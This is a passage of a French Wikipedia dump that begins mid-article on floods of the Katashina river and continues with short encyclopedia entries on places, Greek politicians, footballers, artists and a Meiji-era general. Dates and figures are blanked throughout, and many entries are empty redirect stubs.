Depuis des temps immémoriaux, la pluie, tombant en trombes d'eau, dans l'intérieur des terres, et des typhons, venus de l'océan Pacifique, ont provoqué le débordement de la rivière Katashina. La répétition de ces catastrophes naturelles a contraint les habitants de cette région du Japon à construire des digues et des barrages pour contrôler les crues tout le long du cours d'eau.
Inondations de 1947.
En , le passage du typhon Kathleen sur la région de Kantō donne naissance à des pluies torrentielles qui font sortir le fleuve Tone et ses affluents de leur lit en amont de son cours. Fin septembre, la préfecture de Gunma recense , , et des dizaines de milliers de maisons inondées.

</doc>
<doc id="9411479" url="https://fr.wikipedia.org/wiki?curid=9411479" title="Fibroscopie digestive haute">
Fibroscopie digestive haute



</doc>
<doc id="9411481" url="https://fr.wikipedia.org/wiki?curid=9411481" title="Endoscopie œso-gastro-duodénale">
Endoscopie œso-gastro-duodénale



</doc>
<doc id="9411482" url="https://fr.wikipedia.org/wiki?curid=9411482" title="Evyenia Ouzounidou">
Evyenia Ouzounidou



</doc>
<doc id="9411483" url="https://fr.wikipedia.org/wiki?curid=9411483" title="Endoscopie œsogastroduodénale">
Endoscopie œsogastroduodénale



</doc>
<doc id="9411484" url="https://fr.wikipedia.org/wiki?curid=9411484" title="Endoscopie œso-gastrique">
Endoscopie œso-gastrique



</doc>
<doc id="9411485" url="https://fr.wikipedia.org/wiki?curid=9411485" title="Endoscopie œsogastrique">
Endoscopie œsogastrique



</doc>
<doc id="9411486" url="https://fr.wikipedia.org/wiki?curid=9411486" title="Endoscopie gastrique">
Endoscopie gastrique



</doc>
<doc id="9411487" url="https://fr.wikipedia.org/wiki?curid=9411487" title="Endoscopie gastro-duodénale">
Endoscopie gastro-duodénale



</doc>
<doc id="9411488" url="https://fr.wikipedia.org/wiki?curid=9411488" title="Endoscopie gastroduodénale">
Endoscopie gastroduodénale



</doc>
<doc id="9411489" url="https://fr.wikipedia.org/wiki?curid=9411489" title="EOGD">
EOGD



</doc>
<doc id="9411492" url="https://fr.wikipedia.org/wiki?curid=9411492" title="Giacomo Losi">
Giacomo Losi

Giacomo Losi, né le à Soncino (Lombardie) et mort le à Rome, est un joueur de football international italien, assigné au poste de défenseur, avant de devenir ensuite entraîneur.
Biographie.
Carrière de joueur.
Carrière en club.
Avec le club de l'AS Roma, il remporte deux Coupes d'Italie, une Coupe des villes de foires et une Coupe des Alpes.
Il dispute un total de 454 matchs dans les championnats professionnels italiens, pour 4 buts inscrits.
Carrière en sélection.
Avec l'équipe d'Italie, il joue 11 matchs (pour aucun but inscrit) entre 1960 et 1962. 
Il joue son premier match en équipe nationale le contre l'Espagne. Le , il porte le brassard de capitaine lors d'un match amical face à la Belgique.
Il figure dans le groupe des sélectionnés lors de la Coupe du monde de 1962. Lors du mondial organisé au Chili, il joue deux matchs : contre la RFA et la Suisse.

</doc>
<doc id="9411497" url="https://fr.wikipedia.org/wiki?curid=9411497" title="Les Stepennes">
Les Stepennes

Les Stepennes est un hameau de la commune belge d'Anthisnes en province de Liège. Avant la fusion des communes, le hameau faisait déjà partie de la commune d'Anthisnes.
Situation.
Le petit hameau des Stepennes se trouve à au sud du centre d'Anthisnes dans la campagne condrusienne à l'orée des bois de Comblain le long d'une route en cul-de-sac. Il se trouve à la limite des communes de Comblain-au-Pont et de Hamoir.

</doc>
<doc id="9411498" url="https://fr.wikipedia.org/wiki?curid=9411498" title="Shōwa (Gunma)">
Shōwa (Gunma)

 est un village du district de Tone, dans la préfecture de Gunma au Japon.
Géographie.
Situation.
Le village de Shōwa est situé sur le plateau volcanique Akagi, dans la partie nord-est de la préfecture de Gunma sur l'île de Honshū. Il s'étend du nord au sud sur et, dans sa plus grande longueur, sur environ du mont Akagi au sud-est, à la rivière Katashina au nord-ouest. Celle-ci dessine la limite nord du village et rejoint au nord-ouest le fleuve Tone qui en forme la limite ouest.
La superficie de Shōwa est de dont 40 % de terres agricoles et 32 % de forêts.
Démographie.
Au , la population s'élevait à .
La population du village ne cesse de décroître depuis le début des années 1990, passant de en 1994 à en 2009 puis à en 2015.
Climat.
La température annuelle moyenne est d'environ . L'hiver, le mercure peut descendre jusqu'à et grimper jusqu'à en été. Le village est recouvert par la neige de novembre jusqu'au début de mars.
Toponymie.
Le nom du village a été établi en 1958 sur proposition des villageois. Il fait référence au fait que le village a été fondé à l'ère Shōwa (1926-1989).
Histoire.
Pendant l'ère Edo, l'actuel village de Shōwa était divisé entre six villages du district de Seta dans la province de Kōzuke. C'était un passage obligé pour les seigneurs féodaux de la province d'Echigo et du domaine d'Aizu dans la province de Mutsu soumis au "sankin-kōtai", ce système de résidence alternée qui les obligeait à passer une année sur deux à Edo. Proche de la Nakasendō, une route reliant Edo à Kyoto, c'était aussi une voie de communication destinée aux échanges commerciaux et culturels.
En 1889, la mise en place du nouveau système d'administration des municipalités élaboré par le gouvernement de Meiji impose la fusion des six villages du district de Seta pour former les deux nouveaux villages d'Itonose et Kuroho.
Le , le village de Shōwa est officiellement établi par la fusion des villages d'Itonose et Kuroho.
En , le quartier d'Ogose de l'ancien village d'Akagine voisin est intégré au village.
Économie.
La sériciculture était une activité économique très développée à l'ère Meiji (1868-1912) ; il existait plus de 400 établissements d'élevage de vers à soie qui ont aujourd'hui pratiquement tous disparu. Dans les années 2010, l'agriculture et la sylviculture sont les deux principaux secteurs d'activités économiques du village.
Le village de Shōwa est le où poussent des laitues, des épinards, du "komatsuna" (moutarde épinard du Japon), une sous-espèce de "Brassica rapa", des brocolis, des tomates, des concombres et du konjac, légume emblématique de la production agricole du village.
Culture locale et patrimoine.
Patrimoine culturel.
Le village de Shōwa est membre de l'association des Plus Beaux Villages du Japon depuis 2009.
Château d'Azo.
Propriété du clan Numata à la fin de l'époque Sengoku (milieu du -fin du ) et annexe du château de Numata, le château d'Azo est détruit en 1581 par les troupes du clan Sanada.
Aujourd'hui, de l'ancien château il ne reste que des vestiges.
Château de Nagaizaka.
Le château de Nagaizaka a probablement été construit à l'ère Eiroku (1558-1570). Il était la propriété du clan Nagao et a été l'un des théâtres des guerres opposant les troupes d'Uesugi Kenshin à celles de Takeda Shigen et, plus tard, au clan Hōjō.
En 1590, le château est détruit à l'issue d'une énième confrontation entre les clans Numata et Sanada.
Sites archéologiques.
Le village de Shōwa possède quelques sites archéologiques. Les sites d'Itoitayū, Itoimiyanomae, Nakadana et de Kawahakeikusabara, dans l'ouest du village, sont des lieux de fouilles où des outils en pierre et de la céramique de la période Jōmon, des structures d'habitats primitifs datant des périodes Jōmon, Yayoi et de Heian ont été mis au jour.
Patrimoine naturel.
Arbres centenaires.
Le village de Shōwa est planté de nombreux arbres, en particulier diverses variétés de cerisiers. Certains de ces arbres sont plus que centenaires comme le zelkova du Japon du temple Unshō dans l'ouest du village, haut de et vieux de plus de en 2015.
Spécialités gastronomiques.
Le village de Shōwa est un village agricole qui produit surtout des légumes dont le konjac à partir duquel est élaboré le "konnyaku", une pâte faite de farine de konjac. De nombreuses spécialités culinaires de Shōwa sont à base de "konnyaku" comme le "bibimbap" à la viande hachée, les "dango" ou encore les "gobō maki" de "konnyaku", des rouleaux frits de grande bardane fourrés avec une préparation à base de "konnyaku".
Symboles municipaux.
Depuis , la fleur symbole du village de Shōwa est l'azalée, son arbre symbole est le cerisier du Japon et son oiseau symbole le faisan versicolore, oiseau national du Japon.

</doc>
<doc id="9411503" url="https://fr.wikipedia.org/wiki?curid=9411503" title="Tolumont">
Tolumont



</doc>
<doc id="9411510" url="https://fr.wikipedia.org/wiki?curid=9411510" title="Rivière Coulombe Nord">
Rivière Coulombe Nord

La rivière Coulombe Nord est un tributaire de la rivière Coulombe laquelle se déverse dans le lac Aylmer traversé par la rivière Saint-François qui constitue un affluent de la rive sud du fleuve Saint-Laurent.
Le cours de la rivière Coulombe Nord coule sur la Rive-Sud du fleuve Saint-Laurent, au Québec, Canada. Elle traverse le territoire des municipalités de :
Géographie.
Les principaux bassins versants voisins de rivière Coulombe Nord sont :
La rivière Coulombe Nord prend sa source à l'embouchure d'un petit lac de marais situé du côté nord de la route 161, à au sud du lac Sunday, à l'est du centre du village de Saints-Martyrs-Canadiens et à au sud du lac Breeches.
À partir du lac de tête, la rivière Coulombe Nord coule sur selon les segments suivants :
La rivière Coulombe Nord se déverse en zone forestière sur la rive nord de la rivière Coulombe, dans la municipalité de Beaulac-Garthby.
Toponymie.
Le toponyme Rivière Coulombe Nord a été officialisé le par le Gouvernement du Québec.

</doc>
<doc id="9411515" url="https://fr.wikipedia.org/wiki?curid=9411515" title="Héctor González (footballeur)">
Héctor González (footballeur)



</doc>
<doc id="9411517" url="https://fr.wikipedia.org/wiki?curid=9411517" title="Héctor González Garzón">
Héctor González Garzón



</doc>
<doc id="9411522" url="https://fr.wikipedia.org/wiki?curid=9411522" title="Tumulus de champ Châlons">
Tumulus de champ Châlons



</doc>
<doc id="9411524" url="https://fr.wikipedia.org/wiki?curid=9411524" title="Liste des romans de Jean-Pierre Conty">
Liste des romans de Jean-Pierre Conty

Cette page présente les romans écrits par Jean-Pierre Conty de 1952 à 1985, dont la plupart mettent en scène le héros "Mr Suzuki".

</doc>
<doc id="9411525" url="https://fr.wikipedia.org/wiki?curid=9411525" title="Copa Interamericana 1994">
Copa Interamericana 1994

La Copa Interamericana 1994 est la de la Copa Interamericana. Cet affrontement oppose le club costaricain du CS Cartagines, vainqueur de la Coupe des champions de la CONCACAF 1994 au Vélez Sársfield, club argentin vainqueur de la Copa Libertadores 1994.
Les rencontres ont lieu le et le .
Vélez Sársfield remporte cette quinzième édition sur le score cumulé de 2-0.
Contexte.
Vélez Sársfield a disposé en finale de Sao Paulo (1-0 puis 0-1 (3 t.a.b. à 5) pour remporter la Copa Libertadores 1994 pour leur première victoire dans cette compétition. Les brésiliens étaient le double tenant du titre.
Le CS Cartagines remporte la Coupe des champions de la CONCACAF 1994 disputée sous forme de Final four à San José en Californie. Cartagines dispose en demi-finale de l'Alianza Fútbol Club 2-1 avant de battre en finale le CF Atlante 3-2.

</doc>
<doc id="9411529" url="https://fr.wikipedia.org/wiki?curid=9411529" title="Centre européen de prévision météorologique à moyen terme">
Centre européen de prévision météorologique à moyen terme



</doc>
<doc id="9411531" url="https://fr.wikipedia.org/wiki?curid=9411531" title="Ioánnis Zerdelís">
Ioánnis Zerdelís

Ioánnis Zerdelís () est un homme politique grec.
Biographie.
Aux élections législatives grecques de janvier 2015, il est élu député au Parlement hellénique sur la liste de la SYRIZA dans la circonscription de Lesbos.
Le , il quitte la SYRIZA avec vingt-quatre autres députés dissidents pour créer Unité populaire.

</doc>
<doc id="9411533" url="https://fr.wikipedia.org/wiki?curid=9411533" title="Paolo Mazza">
Paolo Mazza

Paolo Mazza, né le à Vigarano Mainarda en Émilie-Romagne et décédé le à Ferrare, est un footballeur italien, devenu entraîneur et dirigeant sportif.
Il co-dirige l'équipe d'Italie lors de la Coupe du monde 1962 au Chili.

</doc>
<doc id="9411537" url="https://fr.wikipedia.org/wiki?curid=9411537" title="Stávros Grigóris">
Stávros Grigóris

Stávros Grigóris (en grec ), né le à Leucade en Grèce, est un homme politique grec.
Biographie.
Aux élections législatives grecques de janvier 2015, il est élu député au Parlement grec sur la liste de la SYRIZA dans la circonscription de Leucade.

</doc>
<doc id="9411544" url="https://fr.wikipedia.org/wiki?curid=9411544" title="Symeón Ballís">
Symeón Ballís

Symeón Ballís (en grec ), né le à Vólos en Grèce, est un homme politique grec.
Biographie.
Aux élections législatives grecques de janvier 2015, il est élu député au Parlement grec sur la liste de la SYRIZA dans la circonscription de la Magnésie.

</doc>
<doc id="9411547" url="https://fr.wikipedia.org/wiki?curid=9411547" title="Konstantínos Delimítros">
Konstantínos Delimítros

Konstantínos Delimítros (en grec ) est un homme politique grec.
Biographie.
Aux élections législatives grecques de janvier 2015, il est élu député au Parlement hellénique sur la liste de la SYRIZA dans la circonscription de la Magnésie.
Le , il quitte la SYRIZA avec vingt-quatre autres députés dissidents pour créer Unité populaire.

</doc>
<doc id="9411551" url="https://fr.wikipedia.org/wiki?curid=9411551" title="Aléxandros Meïkópoulos">
Aléxandros Meïkópoulos

Aléxandros Meïkópoulos (en grec ), né le , est un homme politique grec.
Biographie.
Aux élections législatives grecques de janvier 2015, il est élu député au Parlement grec sur la liste de la SYRIZA dans la circonscription de la Magnésie.

</doc>
<doc id="9411558" url="https://fr.wikipedia.org/wiki?curid=9411558" title="Liste des tumuli de France protégés aux monuments historiques">
Liste des tumuli de France protégés aux monuments historiques

Cet article recense les tumulus de France protégés aux monuments historiques.
Méthodologie.
La liste prend en compte les tumulus classés ou inscrits au titre des monuments historiques. La date indiquée correspond à l'année de protection.
Liste.
La liste est par défaut triée par ordre alphabétique des départements, puis des communes.

</doc>
<doc id="9411559" url="https://fr.wikipedia.org/wiki?curid=9411559" title="Ekateríni Papanátsiou">
Ekateríni Papanátsiou

Ekateríni Papanátsiou (en grec ), née le à Almyros en Grèce, est une femme politique grecque.
Biographie.
Aux élections législatives grecques de janvier 2015, elle est élue députée au Parlement grec sur la liste de la SYRIZA dans la circonscription de la Magnésie.

</doc>
<doc id="9411569" url="https://fr.wikipedia.org/wiki?curid=9411569" title="Doubs (Doubs)">
Doubs (Doubs)



</doc>
<doc id="9411572" url="https://fr.wikipedia.org/wiki?curid=9411572" title="Corrèze (Corrèze)">
Corrèze (Corrèze)



</doc>
<doc id="9411574" url="https://fr.wikipedia.org/wiki?curid=9411574" title="Guillermo Ortíz">
Guillermo Ortíz

Guillermo Hector Ortíz Camargo, né le à Mexico au Mexique et mort le dans la même ville, est un joueur de football international mexicain, qui évoluait au poste d'attaquant.
Biographie.
Carrière en club.
Avec le Club Necaxa, il remporte une Coupe du Mexique.
Carrière en sélection.
Avec l'équipe du Mexique, il joue 11 matchs (pour 5 buts inscrits) entre 1961 et 1963. 
Il figure dans le groupe des sélectionnés lors de la Coupe du monde de 1962. Il ne joue aucun match lors de la phase finale de cette compétition, mais dispute toutefois deux matchs face au Paraguay comptant pour les tours préliminaires du mondial.

</doc>
<doc id="9411582" url="https://fr.wikipedia.org/wiki?curid=9411582" title="Ali Assoul">
Ali Assoul

Ali Assoul est un wali en Algérie.
Fonctions.
Il a été wali de Mascara de 1974 à 1978 et wali de Bouira de 1978 à 1981.

</doc>
<doc id="9411584" url="https://fr.wikipedia.org/wiki?curid=9411584" title="Pedro Romero (football)">
Pedro Romero (football)

Pedro Romero, né le au Mexique, est un joueur de football mexicain, qui évoluait au poste de milieu de terrain.
Biographie.
Carrière en club.
Avec le Deportivo Toluca, il remporte un championnat du Mexique, et une Supercoupe du Mexique.
Carrière en sélection.
Avec l'équipe du Mexique, il figure dans le groupe des sélectionnés lors de la Coupe du monde de 1962. Il ne joue toutefois aucun match lors de cette compétition.

</doc>
<doc id="9411590" url="https://fr.wikipedia.org/wiki?curid=9411590" title="Charles Bataille">
Charles Bataille

Charles Bataille, né à Pontgouin (Eure-et-Loir) le et mort à Paris le , est un journaliste, chansonnier, poète, romancier et auteur dramatique français.
Biographie.
André Charles Casimir Bataille est le fils de Jean Baptiste André Bataille, laboureur, demeurant à la ferme de la Rivière à Pongouin, natif de Landelles (Eure-et-Loir) et de Françoise Agathe Barbier, native de Marchéville (Eure-et-Loir).
Ses parents souhaitant le voir devenir notaire l'envoient à Paris faire des études de droit qu'il délaisse rapidement, préférant fréquenter le milieu littéraire. Habitant rue Neuve-des-Martyrs, il se lie d'amitié avec Nadar.
Il publie ses premières œuvres en 1850 (poésie et pièce de théâtre). Il est emprisonné en à la prison de Clichy pour dettes.
En 1851, il part à Londres et travaille sous la direction du dessinateur Constantin Guys à un "Illustrated London News" en français qui doit être édité pendant toute la durée de l'Exposition universelle de 1851. Jules Verne lui dédie alors sa chanson "Les Gabiers", chanson maritime sur une musique d'Aristide Hignard, publiée chez J. Meissonnier Fils.
Il fait partie du "Panthéon Nadar" (1854)
À partir de 1854, il collabore à divers journaux dont "Le Gaulois, Le Diogène, Le Charivari" et "Le Figaro" (1854-1866) où il tenait les critiques littéraires, auteur parfois sous les pseudonymes de Paul Dyas ou Antonio, il est célèbre pour être l'auteur de la nécrologie de Charles Baudelaire parue dans "Le Charivari" du . Il apparaît comme un polémiste brillant et un courriériste plein de verve et d'humour.
En 1859, il s'associe avec Amédée Rolland pour écrire un drame réaliste en cinq actes et en prose intitulé "Un usurier de village". Représentée pour la première fois au Théâtre de l'Odéon le , la pièce connaît un succès durable.
Le , il épouse Jeanne Hennequin et s'installe à Enghien 7 rue de Mora.
En 1868, il publie un roman "Antoine Quérard".
Atteint de troubles mentaux, il meurt le au cours d'une crise dans une clinique parisienne situé 90 rue de Picpus où il avait reçu la visite de son compatriote, le cardinal Pie.
Ses obsèques ont lieu le , un hommage lui est rendu par Étienne Carjat. Il est inhumé au cimetière de Montmartre, division 16, le .

</doc>
<doc id="9411595" url="https://fr.wikipedia.org/wiki?curid=9411595" title="Danái Tzíka-Kostopoúlou">
Danái Tzíka-Kostopoúlou

Danái Tzíka-Kostopoúlou (en grec ), née le à Athènes, est une femme politique grecque.
Biographie.
Aux élections législatives grecques de janvier 2015, elle est élue députée au Parlement hellénique sur la liste de la SYRIZA dans la circonscription de la Magnésie. Elle est élue secrétaire pour la première session de la XVIe législature avec 220 votes positifs le .

</doc>
<doc id="9411597" url="https://fr.wikipedia.org/wiki?curid=9411597" title="Liste de peintures de Jean-Baptiste Corneille">
Liste de peintures de Jean-Baptiste Corneille

Cette page dresse la liste des peintures de Jean-Baptiste Corneille (1649-1695)

</doc>
<doc id="9411599" url="https://fr.wikipedia.org/wiki?curid=9411599" title="Alain Desvergnes">
Alain Desvergnes

Alain Desvergnes est un photographe français né le à Périgueux et mort le à Pontivy, dans le Morbihan.
Il a été aussi l'un des personnages clefs de la reconnaissance de la photographie en France dans les années 1970-1980, avec la direction des Rencontres internationales de la photographie d'Arles (1979-1982) et la création, avec Lucien Clergue et Maryse Cordesse en 1982, de l'École nationale supérieure de la photographie toujours à Arles, dont il fut le premier directeur.
Biographie.
Après des études de journalisme et de sociologie, Alain Desvergnes, part, au début des années 1960, en Amérique du Nord, où il reste dix-neuf ans entre le sud des États-Unis et le Canada, étant successivement maître de conférence à l'université du Mississippi (1963-1965), puis professeur associé à l'université d’Ottawa (1966-1974), où il crée le département des arts visuels et enfin, en 1975, professeur agrégé à l'université Saint-Paul d'Ottawa, département des communications sociales.
En 1979, il rentre en France pour prendre la direction des Rencontres internationales de la photographie d'Arles jusqu'en 1982, date à laquelle, à la demande du ministère de la Culture, il crée l'École nationale supérieure de la photographie qu’il a dirigée pendant seize ans.
Alain Desvergnes a exposé dans de nombreux musées et galeries européennes et américaines, ainsi qu'aux aux Rencontres d'Arles en 2012, avec sa série "Paysages en tant que portraits / Portraits en tant que paysages".
Retiré à Étel dans le Morbihan, Alain Desvergnes meurt dans son sommeil le à l’âge de 88 ans.
Collections.
Les photographies d'Alain Desvergnes font notamment partie des collections de la Bibliothèque nationale de France, de la Maison européenne de la photographie, du "Center for Southern Studies" (Mississippi) et du "Canadian National Film Board".

</doc>
<doc id="9411603" url="https://fr.wikipedia.org/wiki?curid=9411603" title="Torsten Laen">
Torsten Laen

Torsten Laen, né le à Odense, est un ancien handballeur danois évoluant au poste de pivot.
Palmarès.
En club.
Compétitions internationales
Compétitions nationales
En sélection.
Championnats d'Europe
Championnats du monde
Championnat du monde junior

</doc>
<doc id="9411605" url="https://fr.wikipedia.org/wiki?curid=9411605" title="Pétros Konstantinéas">
Pétros Konstantinéas

Pétros Konstantinéas (en grec ), né le à Kalamata en Grèce est un homme politique grec.
Biographie.
Aux élections législatives grecques de janvier 2015, il est élu député au Parlement grec sur la liste de la SYRIZA dans la circonscription de la Messénie.

</doc>
<doc id="9411606" url="https://fr.wikipedia.org/wiki?curid=9411606" title="Salvador Farfán">
Salvador Farfán

Salvador Farfán, né le au Mexique et mort le , est un joueur de football international mexicain, qui évoluait au poste de milieu de terrain.
Biographie.
Carrière en club.
Salvador Farfán joue en faveur du Club América et du CF Atlante.
Carrière en sélection.
Avec l'équipe du Mexique, il joue 2 matchs (pour aucun but inscrit) en 1961. 
Il figure dans le groupe des sélectionnés lors de la Coupe du monde de 1962. Il ne joue aucun match lors de la phase finale de cette compétition, mais dispute toutefois deux rencontres face au Paraguay comptant pour les tours préliminaires du mondial.

</doc>
<doc id="9411608" url="https://fr.wikipedia.org/wiki?curid=9411608" title="Albert Perrot (pilote)">
Albert Perrot (pilote)

Albert Louis Perrot, né le à Quarré-les-Tombes et mort le à Boulogne-Billancourt, était un pilote automobile français sur circuits à bord de voitures de sport de la marque Delahaye, essentiellement au début des activités sportives de celle-ci.
Biographie.
Après des débuts sur cyclecars au milieu des années 1920 (en 1924 au Grand Prix du M.C.F., avec un VAL de Salmson), puis quelques apparitions en 1929 sur une Alfa Romeo 6C-1500 (notamment au Grand Prix de Monaco), sa carrière s'étala régulièrement entre 1934 et 1937.
Il participa préalablement encore aux 24 Heures du Mans 1928, sur Salmson CS . avec J. Hasley (après avoir surtout pour cette marque remporté le Grand Prix de Picardie en 1926, alors réservé aux cyclecars).
Après avoir abandonné lors du Grand Prix de Monaco 1929 sur Alfa Romeo 6C, il réorienta sa carrière vers les courses SportsCars, avec cependant encore une participation au Grand Prix de France 1936, où il obtint une cinquième place associé alors à Marcel Dhôme sur Delahaye 135CS. Lors de cette course, quatre voitures Delahaye se classèrent dans la cinq premières (deuxièmes Marcel Mongin et "Michel Paris"), cinq dans les dix premières, et sept dans les douze premières (pour neuf participantes). La saison suivante Perrot fut encore sixième du Grand Prix de Tunisie.
Il fit une réapparition après guerre, lors des 12 Heures de Paris en 1948, avec Louis Gérard sur une Delage D6-3L. anglaise (de W.S. Watney).
Il ne doit pas être confondu avec Albert Perrot, syndicaliste français de la C.G.T. aux PTT, également durant les années 1930.
Palmarès.
Cyclecar:
Sport:

</doc>
<doc id="9411610" url="https://fr.wikipedia.org/wiki?curid=9411610" title="TP S.A. Tower">
TP S.A. Tower



</doc>
<doc id="9411612" url="https://fr.wikipedia.org/wiki?curid=9411612" title="Panayóta Kozombóli-Amanatídi">
Panayóta Kozombóli-Amanatídi

Panayóta Kozombóli-Amanatídi (en grec ), née en 1958 à Kámbos, est une femme politique grecque.
Biographie.
Aux élections législatives grecques de janvier 2015, elle est élue députée au Parlement grec sur la liste de la SYRIZA dans la circonscription de la Messénie.

</doc>
<doc id="9411615" url="https://fr.wikipedia.org/wiki?curid=9411615" title="Athanasios Petrakos">
Athanasios Petrakos



</doc>
<doc id="9411617" url="https://fr.wikipedia.org/wiki?curid=9411617" title="Tchastny Korrespondent">
Tchastny Korrespondent

 (en russe , littéralement : "Correspondant privé") est un magazine en ligne russe fondé en 2008, dont les articles sont sous licence Creative Commons.
Il a obtenu en 2011, le (en russe /), prix gouvernemental russe décerné à des sites nationaux.

</doc>
<doc id="9411621" url="https://fr.wikipedia.org/wiki?curid=9411621" title="Eléni Psarréa">
Eléni Psarréa

Eléni Psarréa (en grec ), née en 1982, est une femme politique grecque.
Biographie.
Aux élections législatives grecques de janvier 2015, elle est élue députée au Parlement hellénique sur la liste de la SYRIZA dans la circonscription de la Messénie.
Le , elle quitte la SYRIZA avec vingt-quatre autres députés dissidents pour créer Unité populaire.

</doc>
<doc id="9411625" url="https://fr.wikipedia.org/wiki?curid=9411625" title="Ioánnis Sifákis">
Ioánnis Sifákis

Ioánnis Sifákis (en grec ), né en 1962, est un homme politique grec.
Biographie.
Aux élections législatives grecques de janvier 2015, il est élu député au Parlement grec sur la liste de la SYRIZA dans la circonscription de Pella.

</doc>
<doc id="9411627" url="https://fr.wikipedia.org/wiki?curid=9411627" title="Zhu Ting (volley-ball)">
Zhu Ting (volley-ball)

Zhu Ting () est une joueuse de volley-ball chinoise née le à Xian de Dancheng (Henan). Elle mesure et joue au poste de réceptionneuse-attaquante. Elle totalise en équipe de Chine.
Biographie.
Elle est nommée porte-drapeau de la délégation chinoise aux Jeux olympiques d'été de 2020 par le Comité olympique chinois, conjointement avec le taekwondoïste Zhao Shuai.
Le , elle devient la première joueuse de l'histoire du volley-ball à remporter cinq titres au cours d'une saison avec deux clubs différents (Vakıfbank Istanbul en 2017-2018, puis avec Imoco Conegliano en 2024-2025).

</doc>
<doc id="9411641" url="https://fr.wikipedia.org/wiki?curid=9411641" title="Olga Sékulic">
Olga Sékulic

Olga Sékulic est une actrice française, née le à .
Biographie.
D'origine serbe, Olga est une actrice née en France le 16 janvier 1973. Elle est la sœur d'Igor Sékulic.

</doc>
<doc id="9411643" url="https://fr.wikipedia.org/wiki?curid=9411643" title="Henri-Jacques Lucas">
Henri-Jacques Lucas

Henri-Jacques Lucas est un juriste universitaire français né à Meknès le et mort à Poitiers le . À l'origine spécialiste de droit international privé, ce professeur agrégé des facultés de droit développe à l'Université de Poitiers le droit de la propriété intellectuelle, en particulier à travers deux structures : le magistère en droit des TIC et le CECOJI (centre de recherches affilié au CNRS). Il coécrit avec son frère, le professeur André Lucas, le "Traité de la propriété littéraire et artistique" aux éditions Litec, dont la quatrième et dernière version est parue peu avant son décès.

</doc>
<doc id="9411644" url="https://fr.wikipedia.org/wiki?curid=9411644" title="Evamag">
Evamag



</doc>
<doc id="9411646" url="https://fr.wikipedia.org/wiki?curid=9411646" title="Feed To Feed">
Feed To Feed



</doc>
<doc id="9411649" url="https://fr.wikipedia.org/wiki?curid=9411649" title="Delilah (Queen)">
Delilah (Queen)



</doc>
<doc id="9411659" url="https://fr.wikipedia.org/wiki?curid=9411659" title="Banque nationale de Belgrade">
Banque nationale de Belgrade



</doc>
<doc id="9411668" url="https://fr.wikipedia.org/wiki?curid=9411668" title="Famille de Bex">
Famille de Bex

La famille de Bex est une famille noble qui a possédé notamment la seigneurie de Bex et la seigneurie de Saint-Paul en Chablais.
Histoire.
Les premiers membres cités de la famille sont Turumbert et Louis, vers 1105. Louis a un fils prénommé Humbert.
En 1138 sont cités Willemus et Garnerius.
Isabelle de Bex épouse à la fin du Guillaume de Blonay et fonde le prieuré de Saint-Paul-en-Chablais, vers 1200.
Clémence de Bex épouse Aymond de la Tour. Leur fils Pierre devient propriétaire du château de Bex en 1227.
Armoiries.
Les armoiries de la famille sont : "d'azur broché d'un dragon d'argent dressé surmonté d'une étoile d'argent de dextre."

</doc>
<doc id="9411671" url="https://fr.wikipedia.org/wiki?curid=9411671" title="4 (Los Hermanos album)">
4 (Los Hermanos album)



</doc>
<doc id="9411673" url="https://fr.wikipedia.org/wiki?curid=9411673" title="Labrus viridis">
Labrus viridis

Labrus viridis, communément appelé Labre vert, est une espèce de poissons de la famille des Labridae.
Description.
"Labrus viridis" peut mesurer jusqu'à . Il a une forme allongée et son corps est fin. Ses couleurs sont très vives. Sa peau présente de petites taches blanches et parfois une bande qui s'étend des yeux à la queue. 
C'est un poisson comestible dont la chair est molle.
Répartition et habitat.
On le trouve à l'est de l'océan Atlantique, du Portugal au Maroc, dans la mer Méditerranée et dans la mer Noire. Il vit dans les côtes rocheuses et les herbiers de posidonie. 

</doc>
<doc id="9411674" url="https://fr.wikipedia.org/wiki?curid=9411674" title="Équipe de Jamaïque masculine de basket-ball">
Équipe de Jamaïque masculine de basket-ball

L'équipe de Jamaïque de basket-ball est la sélection des meilleurs joueurs jamaïcains de basket-ball. Elle est placée sous l'égide de la Fédération de Jamaïque de basket-ball.

</doc>
<doc id="9411682" url="https://fr.wikipedia.org/wiki?curid=9411682" title="Fukushima Yasumasa">
Fukushima Yasumasa

 est un général de l'Armée impériale japonaise de l'ère Meiji ayant exercé une forte influence sur les services secrets japonais. Fukushima a traversé la Russie pour venir jusqu'en Europe (notamment en Allemagne) et est connu pour avoir effectué le voyage du retour au Japon à cheval : "The longest journey". Ce voyage dura 488 jours. Durée pendant laquelle il inspecta les travaux du Transsibérien et collecta diverses informations sur les infrastructures locales, etc.
Origine.
Né dans la province de Shinano (aujourd'hui préfecture de Nagano) dans une famille samouraï, Fukushima Yasumasa est le fils ainé de Fukushima Yasuhiro qui se rattachait au daimyo du domaine de Matsumoto.
Formé pour être un soldat de l'ère moderne. Il a étudié les stratégies militaires, à Edo, à l'école Kaisei puis à lécole militaire Kobusho de "hatamoto" à Tsukiji. Il travaille en tant que traducteur au ministère de la justice en 1874. Il est transféré au Ministère de la Guerre et fait partie de la nouvelle équipe de général.
Il a pris part à la rébellion de Satsuma du côté de l'armée impériale japonaise. Son esprit vif et sa capacité à obtenir de bons rapports avec la population lui ont valu une affectation à l'état-major général de l'armée impériale japonaise à un âge précoce.
Voyages.
Il voyagea pendant plusieurs années, il visita la Mongolie en 1879, et agit comme attaché militaire auprès de Pékin entre 1882 et 1884. Fukushima a visité les Provinces de l'Empire des Indes et la Birmanie en 1886-1887.
Fukushima parlait 10 langues couramment et a été envoyé comme attaché militaire à Berlin de 1887 à 1892. Il s'y est créé une réputation durant ce séjour, avec des paris impliquant des faits d'armes ou de la force physique. Fukushima était un admirateur du colonel Burnaby (Frederick Gustavus Burnaby), un officier de cavalerie britannique, qui avait fait une visite à Khiva en 1874 après avoir reçu mot que les Russes avaient fermé la frontière au Turkestan. Fukushima a également partagé les vues politiques de Burnaby qui voyait la Russie comme le principal ennemi de la Grande-Bretagne et du Japon.
Retour au Japon, "The longest journey".
Pour son retour au Japon, Fukushima a choisi de traverser deux continents à cheval de Berlin à Vladivostok (02.1892-06.1893). Le voyage dura 488 jours (1 an et 4 mois) et avait pour objectifs, l'inspection de la construction et des travaux du Transsibérien ainsi que la collecte de renseignements sur l'infrastructure locale, les commandes et les contrôles. Au cours de ce voyage, le mars 1893, avant d'entrer dans la Mandchourie, il fut promu au grade de lieutenant-colonel.
